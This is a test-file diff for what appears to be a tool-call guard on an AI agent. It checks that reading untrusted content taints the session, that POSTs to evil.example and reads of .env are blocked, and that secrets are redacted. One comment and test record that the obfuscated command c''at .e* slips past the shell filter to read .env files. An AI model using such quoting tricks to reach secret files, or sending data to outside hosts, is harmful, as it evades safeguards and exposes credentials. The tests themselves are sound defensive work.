@@ -105,3 +105,17 @@ def test_tainted_unknown_host_reason_names_taint_source(guard):
     guard.check("read_github_issue", {"number": 42})
     d = guard.check("http_request", {"method": "POST", "url": "https://evil.example/x"})
     assert not d.allowed and "tainted" in d.reason and "evil.example" in d.reason
+
+
+def test_view_image_taints_and_respects_file_rules(guard):
+    assert guard.check("view_image", {"path": "assets/cat.jpeg"}).allowed
+    assert guard.taint.tainted
+    assert not guard.check("view_image", {"path": ".env"}).allowed
+
+
+def test_glob_bypass_output_is_redacted(guard, project):
+    # c''at .e* slips past the text filter (known limit, Docker is the real fix),
+    # but the registered secret is redacted before the model sees it.
+    guard.secrets.register("BANK_API_KEY", "fake-secret")
+    assert guard.check("shell", {"cmd": "c''at .e*"}).allowed
+    assert "fake-secret" not in guard.secrets.redact("BANK_API_KEY=fake-secret")
